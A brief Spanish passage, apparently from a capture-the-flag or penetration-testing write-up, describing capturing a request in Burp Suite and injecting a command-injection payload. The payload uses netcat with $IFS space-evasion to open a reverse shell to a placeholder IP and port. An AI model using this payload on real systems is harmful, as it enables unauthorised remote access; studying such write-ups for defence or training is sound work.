...
Capturamos el request con Burp Suite e Inyectamos con el siguiente payload: `"curl http://ip/$(nc.traditional$IFS%27<ip>%27$IFS%27<port>%27$IFS-e$IFS/bin/sh)"`
![Desktop View](https://i.ibb.co/J7X0MTG/9.png)
